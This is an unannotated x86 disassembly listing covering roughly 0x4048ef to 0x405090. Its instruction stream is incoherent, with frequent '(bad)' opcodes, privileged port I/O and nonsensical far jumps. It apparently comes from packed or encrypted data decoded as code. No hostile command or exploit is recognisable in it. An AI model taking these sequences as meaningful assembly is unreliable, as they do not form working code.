  4048ef:	shl    dh,0x28
  4048f2:	imul   ebx,DWORD PTR [ebx],0xffffff88
  4048f5:	stos   BYTE PTR es:[edi],al
  4048f6:	cmp    eax,0x6fd96a09
  4048fb:	cld    
  4048fc:	push   cs
  4048fd:	mov    ss,esp
  4048ff:	sub    DWORD PTR [ebx+eax*8+0x3a4d3687],esp
  404906:	mov    DWORD PTR [ecx],edi
  404908:	cwde   
  404909:	mov    BYTE PTR [edi-0x44],ch
  40490c:	in     al,dx
  40490d:	mov    esp,0x1fb9020d
  404912:	sub    al,0xd4
  404914:	push   ss
  404915:	aas    
  404916:	cs loop 0x4048a3
  404919:	inc    eax
  40491a:	cmp    ebp,DWORD PTR [edx]
  40491c:	call   0x5818a544
  404921:	dec    esp
  404922:	pop    edx
  404923:	(bad)
  404926:	retf   
  404927:	loope  0x404932
  404929:	jmp    0x40494f
  40492b:	sbb    BYTE PTR [esi-0x1a5b9e13],bh
  404931:	jnp    0x404964
  404933:	(bad)  
  404934:	xrelease mov DWORD PTR [esi],esi
  404937:	and    al,0x32
  404939:	pusha  
  40493a:	sti    
  40493b:	push   edx
  40493c:	nop
  40493d:	lea    edx,[ecx]
  40493f:	xchg   ebp,eax
  404940:	call   0x47ac7bcf
  404945:	adc    ch,BYTE PTR [edx-0x2b]
  404948:	adc    al,ah
  40494a:	repz pushf 
  40494c:	or     edi,0x13
  40494f:	clc    
  404950:	cmp    esp,DWORD PTR [eax+0x4f]
  404953:	bswap  ebx
  404955:	adc    eax,0xae6f8284
  40495a:	ret    0x726c
  40495d:	ror    esi,1
  40495f:	pop    edi
  404960:	push   ecx
  404961:	pop    ebx
  404962:	lock xlat BYTE PTR ds:[ebx]
  404964:	xor    BYTE PTR ds:0xc373ef3d,al
  40496a:	pop    esp
  40496b:	xor    DWORD PTR [edx],edx
  40496d:	ds mov edi,0xf45607c6
  404973:	shl    BYTE PTR [ecx+0x1c2792f],0x6f
  40497a:	inc    eax
  40497b:	xchg   edx,eax
  40497c:	out    dx,al
  40497d:	sbb    BYTE PTR [ebp-0x24b859ed],ch
  404983:	push   edx
  404984:	mov    ebx,0x6e0e26b4
  404989:	ret    
  40498a:	iret   
  40498b:	imul   ebp,DWORD PTR [esi-0x61],0x28
  40498f:	or     esp,DWORD PTR [ebx]
  404991:	out    dx,al
  404992:	xor    al,0x2e
  404994:	pop    edi
  404995:	push   0x69e04c89
  40499a:	fwait
  40499b:	pop    ebp
  40499c:	add    al,0x51
  40499e:	int    0x8d
  4049a0:	dec    edi
  4049a1:	adc    esp,DWORD PTR [ecx-0x52]
  4049a4:	in     al,dx
  4049a5:	jbe    0x4049f6
  4049a7:	test   eax,0xe9f9e119
  4049ac:	iret   
  4049ad:	pusha  
  4049ae:	pop    ebx
  4049af:	ret    0x42d1
  4049b2:	leave  
  4049b3:	dec    ecx
  4049b4:	scas   al,BYTE PTR es:[edi]
  4049b5:	shr    DWORD PTR [esp+ebp*8+0x5c44b62e],cl
  4049bc:	lock inc edi
  4049be:	mov    al,ds:0x5b1db8a
  4049c3:	loopne 0x404a30
  4049c5:	xchg   ebp,eax
  4049c6:	and    DWORD PTR [eax],edx
  4049c8:	cmp    al,0x9b
  4049ca:	stos   DWORD PTR es:[edi],eax
  4049cb:	frstor [esi-0x53]
  4049ce:	sbb    ecx,DWORD PTR [eax-0x2d]
  4049d1:	popf   
  4049d2:	mul    DWORD PTR [edx]
  4049d4:	pop    ebp
  4049d5:	cs jns 0x404a1e
  4049d8:	icebp  
  4049d9:	inc    edx
  4049da:	outs   dx,DWORD PTR ds:[esi]
  4049db:	repnz dec esp
  4049dd:	ds add eax,0x7cee89aa
  4049e3:	arpl   sp,sp
  4049e5:	xor    DWORD PTR [ebx+0x240f455e],esi
  4049eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049ec:	aas    
  4049ed:	rcr    bh,0xe0
  4049f0:	jbe    0x4049e5
  4049f2:	xchg   BYTE PTR [edi-0x4cf10156],cl
  4049f8:	and    ch,al
  4049fa:	dec    ebp
  4049fb:	dec    esi
  4049fc:	lods   eax,DWORD PTR ds:[esi]
  4049fd:	stos   BYTE PTR es:[edi],al
  4049fe:	fst    DWORD PTR [esi]
  404a00:	jecxz  0x404a5c
  404a02:	and    eax,0xcab8e542
  404a07:	pusha  
  404a08:	jmp    0x5418:0x23406d1b
  404a0f:	mov    dl,0x17
  404a11:	ins    BYTE PTR es:[edi],dx
  404a12:	lds    esi,FWORD PTR [edx]
  404a14:	es add al,0x26
  404a17:	gs jp  0x404a62
  404a1a:	jnp    0x404a24
  404a1c:	sbb    eax,0xef4e9ebd
  404a21:	(bad)  
  404a22:	jmp    DWORD PTR [eax+0x7]
  404a25:	neg    DWORD PTR [eax]
  404a27:	test   eax,0xdfd32aa6
  404a2c:	inc    edx
  404a2d:	das    
  404a2e:	jge    0x404a5c
  404a30:	ds xchg eax,ecx
  404a33:	retf   0xaf39
  404a36:	stc    
  404a37:	(bad)  
  404a38:	out    dx,eax
  404a39:	or     eax,0x5407f164
  404a3e:	adc    cl,BYTE PTR [ecx]
  404a40:	(bad)  
  404a41:	mov    ah,0xb5
  404a43:	or     dh,dh
  404a45:	jg     0x404a67
  404a47:	test   DWORD PTR [edi+0x29],esp
  404a4a:	push   edx
  404a4b:	fild   WORD PTR [eax+ecx*1+0x73]
  404a4f:	sub    esp,DWORD PTR [ecx+0x4fa6b72]
  404a55:	jg     0x404ac2
  404a57:	jb     0x404a58
  404a59:	sahf   
  404a5a:	xor    al,dl
  404a5c:	lock retf 0xfb0e
  404a60:	outs   dx,DWORD PTR ds:[esi]
  404a61:	push   ebx
  404a62:	loop   0x404a94
  404a64:	adc    ah,al
  404a66:	sub    ecx,esp
  404a68:	mov    es,WORD PTR [edi+ecx*1]
  404a6b:	sbb    DWORD PTR [edx],ebp
  404a6d:	ds or  ecx,ebp
  404a70:	jne    0x404a16
  404a72:	dec    eax
  404a73:	adc    ecx,DWORD PTR [ebx-0x38dc545a]
  404a79:	out    dx,al
  404a7a:	outs   dx,DWORD PTR ds:[esi]
  404a7b:	hlt    
  404a7c:	adc    eax,0x8e5c7deb
  404a81:	rol    DWORD PTR [eax],cl
  404a83:	add    BYTE PTR [edx-0x92f6156],dh
  404a89:	mov    esp,0x5c7ada6b
  404a8e:	in     eax,dx
  404a8f:	pop    edi
  404a90:	lods   al,BYTE PTR ds:[esi]
  404a91:	(bad)  
  404a92:	cmp    eax,0x5f865b75
  404a97:	in     eax,dx
  404a98:	popf   
  404a99:	pop    esi
  404a9a:	xchg   DWORD PTR [ebx+ecx*4],ecx
  404a9d:	dec    edi
  404a9e:	xchg   BYTE PTR [ebx-0x321702b8],ch
  404aa4:	cmp    BYTE PTR [esi+0x4],dh
  404aa7:	sti    
  404aa8:	fld    DWORD PTR [ebp-0x6c811377]
  404aae:	pop    esi
  404aaf:	sahf   
  404ab0:	rcl    DWORD PTR [eax],cl
  404ab2:	cmc    
  404ab3:	xchg   DWORD PTR [ebp+0x35],edx
  404ab6:	cmp    dh,BYTE PTR [edi]
  404ab8:	repz loop 0x404a9f
  404abb:	ficom  DWORD PTR [ecx+0x30]
  404abe:	sbb    ecx,0xf6c8db99
  404ac4:	sub    DWORD PTR cs:[ebx-0x5294bcbd],ebx
  404acb:	lea    edi,[edx-0x3]
  404ace:	loope  0x404ad3
  404ad0:	and    eax,0x802732d0
  404ad5:	das    
  404ad6:	dec    ecx
  404ad7:	popa   
  404ad8:	xlat   BYTE PTR ds:[ebx]
  404ad9:	js     0x404ae9
  404adb:	xchg   ecx,eax
  404adc:	ror    DWORD PTR [ebp+0x370b2e0b],cl
  404ae2:	add    BYTE PTR [ecx-0x55],0xdb
  404ae6:	mov    esi,0x99b24ba7
  404aeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404aec:	imul   ebx,DWORD PTR ds:0x5a6e9a4d,0x3c
  404af3:	lds    esi,FWORD PTR [edx+0x78b3209]
  404af9:	and    BYTE PTR [edx],dl
  404afb:	xchg   edx,eax
  404afc:	xchg   ebp,eax
  404afd:	mov    ah,BYTE PTR [ecx-0x65]
  404b00:	ds jbe 0x404afe
  404b03:	cmp    edi,esp
  404b05:	jae    0x404b1c
  404b07:	inc    edx
  404b08:	push   0x8db4914b
  404b0d:	jns    0x404b2c
  404b0f:	pop    eax
  404b10:	loope  0x404b75
  404b12:	mov    ds:0x33160844,eax
  404b17:	mov    al,0x38
  404b19:	cmc    
  404b1a:	data16 sbb BYTE PTR [edx-0x974d15b],ch
  404b21:	pop    esp
  404b22:	and    BYTE PTR ds:0xf4dfadc0,dl
  404b28:	pop    edi
  404b29:	adc    eax,0xc97f2311
  404b2e:	lds    ecx,FWORD PTR [esi-0x7336d71d]
  404b34:	sbb    esp,DWORD PTR [esi+0x646aa333]
  404b3a:	fstp   DWORD PTR [esi-0x5d7c1309]
  404b40:	push   eax
  404b41:	dec    esi
  404b42:	hlt    
  404b43:	cwde   
  404b44:	sbb    edx,ebx
  404b46:	(bad)  
  404b47:	mov    eax,0x797a0b76
  404b4c:	push   ds
  404b4d:	xchg   DWORD PTR [esi-0x390434ee],eax
  404b53:	call   0x16f7b777
  404b58:	test   al,0xa8
  404b5a:	sbb    bl,ah
  404b5c:	cmp    eax,0xb8900414
  404b61:	and    ecx,DWORD PTR [ecx-0x53]
  404b64:	jo     0x404b9d
  404b66:	pop    ss
  404b67:	leave  
  404b68:	or     dl,cl
  404b6a:	int    0x1e
  404b6c:	push   esp
  404b6d:	test   DWORD PTR [eax+0x5e],ebx
  404b70:	sahf   
  404b71:	leave  
  404b72:	and    eax,0x3d040b81
  404b77:	adc    dh,BYTE PTR [edi]
  404b79:	in     eax,0x63
  404b7b:	gs sub eax,0x2683d4b4
  404b81:	dec    edi
  404b82:	sbb    BYTE PTR [eax+0x42],ah
  404b85:	push   edx
  404b86:	pop    ds
  404b87:	ins    DWORD PTR es:[edi],dx
  404b88:	stc    
  404b89:	sbb    DWORD PTR [edx+esi*1+0x6e5b28d3],edx
  404b90:	xchg   BYTE PTR [edx+ebx*1-0x30],bh
  404b94:	icebp  
  404b95:	dec    esp
  404b96:	mov    bh,BYTE PTR [ecx]
  404b98:	js     0x404b32
  404b9a:	ret    0x8dd0
  404b9d:	retf   0x6285
  404ba0:	fsubr  DWORD PTR [edx+eiz*4-0x19]
  404ba4:	jbe    0x404c09
  404ba6:	mov    ds:0x82fde66e,eax
  404bab:	cdq    
  404bac:	cld    
  404bad:	dec    edx
  404bae:	(bad)  
  404baf:	lods   al,BYTE PTR ds:[esi]
  404bb0:	dec    esp
  404bb1:	ja     0x404baf
  404bb3:	sti    
  404bb4:	add    DWORD PTR [ebp+eax*1+0x22],ebp
  404bb8:	cmp    esp,0x45f62104
  404bbe:	mov    eax,0xd77ef5d1
  404bc3:	ss jl  0x404bb2
  404bc6:	fnstsw ax
  404bc8:	xchg   edi,eax
  404bc9:	adc    BYTE PTR [ecx-0x75],0x9
  404bcd:	xchg   esp,eax
  404bce:	gs (bad) 
  404bd0:	call   0x6c57:0x35753053
  404bd7:	and    ah,BYTE PTR [ecx-0x27]
  404bda:	data16 fdivr QWORD PTR [ecx]
  404bdd:	mov    ds:0x47944be5,al
  404be2:	call   0x4282:0x23ecb2c6
  404be9:	xor    dh,BYTE PTR [eax+0x58486568]
  404bef:	xor    DWORD PTR [ecx+0x4cfe73ab],edx
  404bf5:	jmp    0x1de9:0x6a95871
  404bfc:	inc    edx
  404bfd:	push   ss
  404bfe:	adc    BYTE PTR [eax+0x25],0xf1
  404c02:	sub    eax,0xcde2869d
  404c07:	cmc    
  404c08:	daa    
  404c09:	mov    ecx,0xb0e1457b
  404c0e:	(bad)  
  404c0f:	shr    dl,1
  404c11:	inc    eax
  404c12:	and    edi,ebp
  404c14:	adc    cl,cl
  404c16:	pop    ebx
  404c17:	stc    
  404c18:	dec    ebx
  404c19:	addr16 sti 
  404c1b:	adc    al,0xe3
  404c1d:	inc    esp
  404c1e:	je     0x404bad
  404c20:	cmp    al,0xcc
  404c22:	sub    edx,DWORD PTR [eax-0x77]
  404c25:	stc    
  404c26:	mov    ds:0x5f706f7b,eax
  404c2b:	fisubr DWORD PTR [edx+eax*8+0x37e35f1e]
  404c32:	sbb    BYTE PTR [ecx+edx*1+0x1],dh
  404c36:	lods   eax,DWORD PTR ds:[esi]
  404c37:	das    
  404c38:	adc    cl,BYTE PTR [ebp+0x16e3f90f]
  404c3e:	in     eax,dx
  404c3f:	loop   0x404cbe
  404c41:	rol    BYTE PTR [ebp+0x72742734],0x80
  404c48:	sti    
  404c49:	jecxz  0x404c8d
  404c4b:	test   BYTE PTR [esi+eiz*8+0x73fd06d7],0x17
  404c53:	or     al,0x25
  404c55:	outs   dx,DWORD PTR ds:[esi]
  404c56:	fadd   st(3),st
  404c58:	mov    al,0x32
  404c5a:	jp     0x404caf
  404c5c:	pop    esi
  404c5d:	sub    edi,eax
  404c5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c60:	xchg   edx,eax
  404c61:	fisubr DWORD PTR [ecx]
  404c63:	push   edi
  404c64:	dec    edi
  404c65:	in     al,dx
  404c66:	stos   DWORD PTR es:[edi],eax
  404c67:	sub    edi,edi
  404c69:	dec    esp
  404c6a:	xor    bh,BYTE PTR [edi]
  404c6c:	or     ah,0x55
  404c6f:	adc    al,0x4f
  404c71:	xor    BYTE PTR [eax],bh
  404c73:	mov    ecx,0x19f020d0
  404c78:	lea    edi,[edx+0x7f5a3546]
  404c7e:	sub    eax,DWORD PTR ds:0xedfb
  404c83:	les    edx,FWORD PTR [ebp+0x6d]
  404c86:	dec    esi
  404c87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c88:	in     al,0x98
  404c8a:	xor    bh,ch
  404c8c:	and    al,0x2c
  404c8e:	shl    esi,1
  404c90:	inc    ebx
  404c91:	jbe    0x404c1a
  404c93:	fsubr  st(1),st
  404c95:	rep outs dx,DWORD PTR ds:[esi]
  404c97:	arpl   WORD PTR ds:0xd744d682,di
  404c9d:	rcl    DWORD PTR [ecx-0x66c5aac9],0x82
  404ca4:	mov    DWORD PTR [edi-0x54f5ab43],ecx
  404caa:	sbb    cl,BYTE PTR [edx+0x56]
  404cad:	sub    al,0x4e
  404caf:	mov    cl,0xd6
  404cb1:	push   esp
  404cb2:	push   ds
  404cb3:	rol    DWORD PTR [ebx+0x5f50cb7e],0x27
  404cba:	popa   
  404cbb:	xchg   ebx,eax
  404cbc:	cmp    BYTE PTR [ecx+0x6e],dh
  404cbf:	push   edx
  404cc0:	lods   eax,DWORD PTR ds:[esi]
  404cc1:	vpandn xmm1,xmm4,xmm7
  404cc6:	popf   
  404cc7:	cdq    
  404cc8:	sub    edi,DWORD PTR gs:[ecx+0x5ac5f44a]
  404ccf:	mov    BYTE PTR [esi],cl
  404cd1:	jp     0x404c95
  404cd3:	icebp  
  404cd4:	aad    0x16
  404cd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cd7:	int3   
  404cd8:	mov    bh,0x35
  404cda:	mov    ds:0x90b2b383,eax
  404cdf:	push   eax
  404ce0:	mov    WORD PTR [edx-0x71d749d5],gs
  404ce6:	and    edi,DWORD PTR [esi]
  404ce8:	push   edi
  404ce9:	dec    eax
  404cea:	ss xor eax,0x7abb55d9
  404cf0:	inc    edx
  404cf1:	sahf   
  404cf2:	retf   
  404cf3:	adc    DWORD PTR [esi-0x13792ef7],edi
  404cf9:	adc    al,0x3c
  404cfb:	xchg   ebp,eax
  404cfc:	mov    al,0x5c
  404cfe:	ins    BYTE PTR es:[edi],dx
  404cff:	and    DWORD PTR [ebx],edi
  404d01:	ret    
  404d02:	retf   0xdc88
  404d05:	mov    al,0x2b
  404d07:	stos   DWORD PTR es:[edi],eax
  404d08:	les    ecx,FWORD PTR [edi-0x72bfb310]
  404d0e:	je     0x404d8f
  404d10:	mov    al,BYTE PTR [edi]
  404d12:	popa   
  404d13:	dec    esp
  404d14:	mov    eax,ds:0x60195a4c
  404d19:	adc    al,0xa6
  404d1b:	loop   0x404ce9
  404d1d:	pop    es
  404d1e:	in     al,0x10
  404d20:	xor    BYTE PTR [edx],bl
  404d22:	gs push ebx
  404d24:	retf   0xa5d
  404d27:	rcr    eax,0xe2
  404d2a:	or     bh,BYTE PTR [eax+ecx*1+0x75]
  404d2e:	mov    cl,bh
  404d30:	and    al,BYTE PTR [ebx]
  404d32:	jnp    0x404ce8
  404d34:	mov    ebp,0x1db4081a
  404d39:	retf   
  404d3a:	sbb    BYTE PTR [esi-0x58bacc2],dl
  404d40:	mov    ebx,0x95099131
  404d45:	mov    edx,0x1798a09e
  404d4a:	imul   ecx,DWORD PTR [ebp+edx*1+0x5583dc19],0x68f5b013
  404d55:	outs   dx,DWORD PTR ds:[esi]
  404d56:	repnz ss add al,0xde
  404d5a:	mov    cs,ecx
  404d5c:	mov    al,0x9d
  404d5e:	lods   eax,DWORD PTR ds:[esi]
  404d5f:	bound  ebx,QWORD PTR [esi-0x2d]
  404d62:	test   BYTE PTR [eax],0x8c
  404d65:	rcl    BYTE PTR [esi-0x33],cl
  404d68:	lods   al,BYTE PTR ds:[esi]
  404d69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d6a:	add    eax,0x88d4476b
  404d6f:	inc    edx
  404d70:	fdiv   QWORD PTR [edx+0x4]
  404d74:	rcl    BYTE PTR [edx],0x19
  404d77:	shr    DWORD PTR [esi-0x4b],cl
  404d7a:	idiv   BYTE PTR [edx-0x6bd05ec1]
  404d80:	mov    ah,0x85
  404d82:	js     0x404ddc
  404d84:	pop    ds
  404d85:	inc    eax
  404d86:	mov    WORD PTR [edi+0x5f],es
  404d89:	pop    esi
  404d8a:	mov    cl,0xa6
  404d8c:	push   esi
  404d8d:	push   ebp
  404d8e:	pusha  
  404d8f:	dec    esp
  404d90:	lods   eax,DWORD PTR ds:[esi]
  404d91:	pushf  
  404d92:	test   al,0x10
  404d94:	jge    0x404d78
  404d96:	mov    esi,DWORD PTR [eax-0x78]
  404d99:	das    
  404d9a:	sbb    DWORD PTR [esi+0x5a],0xf3bf6c43
  404da1:	scas   al,BYTE PTR es:[edi]
  404da2:	sbb    dh,BYTE PTR [ebp+eiz*2+0x67]
  404da6:	or     eax,0x8754ff34
  404dab:	mov    esp,0x5220744
  404db0:	leave  
  404db1:	sub    DWORD PTR [esi-0x77d53008],0xffffffc9
  404db8:	mov    cl,0xbd
  404dba:	mov    ds:0x8aab8d81,al
  404dbf:	adc    BYTE PTR [ecx+0x6f],bl
  404dc2:	sub    cl,ch
  404dc4:	adc    dl,BYTE PTR [edi]
  404dc6:	inc    esi
  404dc7:	adc    eax,0x4fac9659
  404dcc:	or     BYTE PTR [edx],dl
  404dce:	push   edi
  404dcf:	cmp    dh,BYTE PTR [ecx-0x46]
  404dd2:	inc    ebx
  404dd3:	js     0x404d6e
  404dd5:	lods   al,BYTE PTR ds:[esi]
  404dd6:	adc    esi,eax
  404dd8:	retf   0x73bd
  404ddb:	push   edx
  404ddc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ddd:	enter  0xc601,0xfd
  404de1:	ffree  st(2)
  404de3:	or     eax,0xd3761f3f
  404de8:	cs push 0x76
  404deb:	jmp    0x2810dcea
  404df0:	ret    
  404df1:	xlat   BYTE PTR ds:[ebx]
  404df2:	pop    ds
  404df3:	mov    ebp,0xc4abf072
  404df8:	push   ecx
  404df9:	rcr    BYTE PTR [ebx+0x29c6bbcc],1
  404dff:	loopne 0x404e65
  404e01:	xchg   ebp,eax
  404e02:	(bad)  
  404e03:	jbe    0x404dd5
  404e05:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  404e07:	outs   dx,BYTE PTR ds:[esi]
  404e08:	lock sbb ah,BYTE PTR [eax+ebx*2+0x6e]
  404e0d:	xor    DWORD PTR ds:0x639de361,ebp
  404e13:	jl     0x404ddd
  404e15:	and    DWORD PTR [ebx],eax
  404e17:	aad    0x35
  404e19:	pop    edi
  404e1b:	ret    
  404e1c:	or     ecx,DWORD PTR [eax]
  404e1e:	pop    edi
  404e1f:	sub    edi,eax
  404e21:	add    edi,DWORD PTR [edi]
  404e23:	pop    esi
  404e24:	or     bh,BYTE PTR [edx]
  404e26:	adc    cl,BYTE PTR [eax-0x51]
  404e29:	in     al,dx
  404e2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e2b:	jl     0x404db5
  404e2d:	and    ebx,DWORD PTR [ebp-0x291d54ba]
  404e33:	lods   eax,DWORD PTR ds:[esi]
  404e34:	xor    ch,cl
  404e36:	xchg   eax,esi
  404e38:	inc    ebp
  404e39:	or     esp,DWORD PTR [edx+0x33]
  404e3c:	jbe    0x404df1
  404e3e:	jmp    0xfce5:0xf02cf29c
  404e45:	mov    dh,dh
  404e47:	repz cwde 
  404e49:	xchg   dh,ch
  404e4b:	add    eax,0x65b7f690
  404e50:	xor    BYTE PTR [eax+ebx*1],al
  404e53:	sti    
  404e54:	jg     0x404ddd
  404e56:	fwait
  404e57:	stc    
  404e58:	leave  
  404e59:	push   edx
  404e5a:	sub    eax,0xf062523a
  404e60:	xor    al,0x9b
  404e62:	xchg   edi,eax
  404e63:	out    0xde,eax
  404e65:	dec    esp
  404e66:	aad    0x99
  404e68:	pop    ss
  404e69:	and    al,0x31
  404e6b:	in     eax,0x71
  404e6d:	jns    0x404ee1
  404e6f:	(bad)  
  404e70:	xor    ebx,DWORD PTR [ebx+0x1490d239]
  404e76:	pop    edx
  404e77:	data16 mov bl,0xc5
  404e7a:	and    BYTE PTR [ebx],bh
  404e7c:	xor    al,0xdc
  404e7e:	aad    0x94
  404e80:	pop    es
  404e81:	sub    esp,eax
  404e83:	dec    DWORD PTR [ebp-0x44]
  404e86:	dec    ebx
  404e87:	ja     0x404ef0
  404e89:	sahf   
  404e8a:	retf   
  404e8b:	sub    ebx,esi
  404e8d:	test   DWORD PTR [eax+0x66],ebx
  404e90:	cmp    dh,bh
  404e92:	sub    DWORD PTR [esi-0x54],ebx
  404e95:	xchg   esi,eax
  404e96:	cs stos BYTE PTR es:[edi],al
  404e98:	pushf  
  404e99:	fisubr WORD PTR [ecx]
  404e9b:	pop    ecx
  404e9c:	fcmovnbe st,st(2)
  404e9e:	fdivr  QWORD PTR [ecx+eax*1]
  404ea1:	test   eax,0x8eaa65d7
  404ea6:	jno    0x404f24
  404ea8:	arpl   bp,dx
  404eaa:	lods   al,BYTE PTR ds:[esi]
  404eab:	jb     0x404ee3
  404ead:	inc    ecx
  404eae:	mov    bh,0x69
  404eb0:	in     eax,0x7a
  404eb2:	fcomp  DWORD PTR [edi+0x44285beb]
  404eb8:	loope  0x404ebe
  404eba:	aam    0xb9
  404ebc:	test   DWORD PTR [esi],ebx
  404ebe:	or     bl,BYTE PTR [esi-0x58]
  404ec1:	jle    0x404e8f
  404ec3:	and    DWORD PTR [eiz*8-0x72f395a],esi
  404eca:	test   BYTE PTR [ecx-0xf],cl
  404ecd:	ffreep st(3)
  404ecf:	fadd   QWORD PTR [edx+0x3b]
  404ed2:	lock ds mov bh,0xa4
  404ed6:	inc    eax
  404ed7:	repz or ch,BYTE PTR cs:[esi+0x6f]
  404edc:	pop    ss
  404edd:	cmp    ecx,0x9da55ee0
  404ee3:	push   ds
  404ee4:	ret    0x41ea
  404ee7:	inc    eax
  404ee8:	stc    
  404ee9:	add    eax,0x99f21120
  404eee:	push   cs
  404eef:	mov    esi,esp
  404ef1:	jmp    0x404ea2
  404ef3:	test   eax,0x4c1d1010
  404ef8:	aad    0xa
  404efa:	or     eax,0x97897808
  404eff:	and    esp,DWORD PTR [edx+0x51]
  404f02:	pop    edx
  404f03:	jnp    0x404f16
  404f05:	xor    BYTE PTR [edx-0x3d],dh
  404f08:	js     0x404f0e
  404f0a:	ror    DWORD PTR [ebp+0x4d],1
  404f0d:	sbb    esp,esp
  404f0f:	(bad)  
  404f10:	int3   
  404f11:	fxch   st(1)
  404f13:	dec    ebp
  404f14:	enter  0xac56,0xa8
  404f18:	and    bh,ch
  404f1a:	sub    ebp,0xffffffc7
  404f1d:	fimul  WORD PTR [eax+0x26]
  404f20:	push   esi
  404f21:	fcmovnb st,st(7)
  404f23:	dec    ecx
  404f24:	xor    esi,0x27
  404f27:	sbb    al,0x4
  404f29:	(bad)  
  404f2a:	lock pop ecx
  404f2c:	(bad)  
  404f2d:	add    DWORD PTR [edx+0x61],ebp
  404f30:	scas   al,BYTE PTR es:[edi]
  404f31:	lahf   
  404f32:	or     al,0x1f
  404f34:	shl    DWORD PTR [ebx],1
  404f36:	rcr    DWORD PTR [edi+ecx*8-0x35],1
  404f3a:	femms  
  404f3c:	jmp    0x9567:0x9ae31b2a
  404f43:	dec    edi
  404f44:	pop    ebp
  404f45:	lods   al,BYTE PTR ds:[esi]
  404f46:	in     al,0xe8
  404f48:	mov    cl,dl
  404f4a:	shl    edx,1
  404f4c:	repz mov esp,0x41ad9b47
  404f52:	icebp  
  404f53:	call   0x2e43c2
  404f58:	sbb    ebp,DWORD PTR [edi]
  404f5a:	popa   
  404f5b:	leave  
  404f5c:	xchg   esp,eax
  404f5d:	retf   0x7e55
  404f60:	mov    ds:0xd25201d7,eax
  404f65:	fstp   TBYTE PTR [ecx+0x35eba2be]
  404f6b:	mov    ch,0x3b
  404f6d:	push   esi
  404f6e:	xlat   BYTE PTR ds:[ebx]
  404f6f:	lahf   
  404f70:	sub    al,0x71
  404f72:	sub    edi,ebp
  404f74:	inc    edi
  404f75:	cmp    dh,BYTE PTR [ebx+0x2412a3fc]
  404f7b:	jmp    0x404f26
  404f7d:	pop    ebx
  404f7e:	inc    edx
  404f7f:	(bad)  
  404f80:	je     0x404f1e
  404f82:	mov    eax,ds:0x9420ec0e
  404f87:	(bad)  
  404f88:	loopne 0x404f4f
  404f8a:	inc    edx
  404f8b:	cmc    
  404f8c:	xor    dh,ch
  404f8e:	add    eax,0x854ac7cc
  404f93:	test   DWORD PTR [edx],esi
  404f95:	pusha  
  404f96:	cmp    dh,BYTE PTR [eax+0x5c]
  404f99:	les    esp,FWORD PTR [edi]
  404f9b:	mov    bh,0xcf
  404f9d:	rol    ecx,1
  404f9f:	aaa    
  404fa0:	pop    ebx
  404fa1:	add    dl,BYTE PTR [edi+eiz*2]
  404fa4:	cmp    BYTE PTR [eax-0x4ec6ef],0xac
  404fab:	daa    
  404fac:	int3   
  404fad:	in     al,0x6b
  404faf:	and    DWORD PTR [edi-0x7eb0d3de],ebp
  404fb5:	loopne 0x404f65
  404fb7:	sbb    eax,0x10e57a95
  404fbc:	leave  
  404fbd:	sub    ecx,eax
  404fbf:	inc    esp
  404fc0:	inc    edx
  404fc1:	daa    
  404fc2:	in     al,dx
  404fc3:	dec    ecx
  404fc4:	scas   eax,DWORD PTR es:[edi]
  404fc5:	sub    BYTE PTR [eax],ch
  404fc7:	mov    edx,0x2f3ddf42
  404fcc:	inc    ecx
  404fcd:	les    edi,FWORD PTR [ecx-0x7c]
  404fd0:	inc    esp
  404fd1:	arpl   WORD PTR [ecx-0x210342d6],sp
  404fd7:	cld    
  404fd8:	call   FWORD PTR [ebx]
  404fda:	in     eax,0xa6
  404fdc:	sbb    DWORD PTR [ebx-0x14],esi
  404fdf:	sbb    DWORD PTR [edx+0x15f492d9],eax
  404fe5:	inc    esi
  404fe6:	es clc 
  404fe8:	sub    al,0xcc
  404fea:	push   es
  404feb:	cld    
  404fec:	push   ecx
  404fed:	push   es
  404fee:	(bad)  
  404fef:	mov    edi,0x231b89aa
  404ff4:	xor    cl,BYTE PTR [eax]
  404ff6:	jno    0x404fcd
  404ff8:	cdq    
  404ff9:	xor    edx,DWORD PTR [edx+0x1375ba87]
  404fff:	pusha  
  405000:	pop    edx
  405001:	and    al,dh
  405003:	ret    0xd3ee
  405006:	bswap  edi
  405008:	rcr    BYTE PTR [edx*8+0x3c781a68],cl
  40500f:	push   0x4e
  405011:	retf   
  405012:	sbb    ecx,DWORD PTR [edx-0x1d]
  405015:	rol    BYTE PTR [ebx],1
  405017:	mov    ebx,0x57cc7867
  40501c:	mov    bh,0xb5
  40501e:	push   es
  40501f:	or     eax,0x4ef24f17
  405024:	or     DWORD PTR [esi+eiz*2-0x1571466c],ebp
  40502b:	sahf   
  40502c:	shr    DWORD PTR ds:[esi+0x32a759b7],1
  405033:	int3   
  405034:	jmp    0xda365ea4
  405039:	mov    cl,0x86
  40503b:	xchg   edx,eax
  40503c:	cmp    BYTE PTR [edi],dh
  40503e:	hlt    
  40503f:	xchg   DWORD PTR [ebp-0x6c721aaa],ebp
  405045:	imul   edx,DWORD PTR [edx+0xb],0xfffffffd
  405049:	pop    eax
  40504a:	not    DWORD PTR [eax+0xe8017f]
  405050:	pop    ecx
  405051:	sahf   
  405052:	ds mov cl,0x6c
  405055:	(bad)  
  405056:	xor    al,0x10
  405058:	add    edi,DWORD PTR [esi-0xa97d6ba]
  40505e:	outs   dx,BYTE PTR ds:[si]
  405060:	cmp    edi,ecx
  405062:	scas   al,BYTE PTR es:[edi]
  405063:	xchg   DWORD PTR [edi-0x5b],esi
  405066:	int3   
  405067:	or     eax,0x1cb9331f
  40506c:	cmp    bl,BYTE PTR [ebx+0x6d]
  40506f:	inc    edi
  405070:	test   eax,0x52266ab6
  405075:	xor    DWORD PTR [esi+0x61aa035b],edx
  40507b:	jg     0x405007
  40507d:	(bad)  
  40507e:	aaa    
  40507f:	pop    ecx
  405080:	push   esp
  405081:	or     DWORD PTR [edi-0x5a],ecx
  405084:	pusha  
  405085:	jns    0x40504e
  405087:	fisttp DWORD PTR gs:0xdbd7f8cf
  40508e:	int3   
  40508f:	popf   
  405090:	sbb    eax,0xca5da092
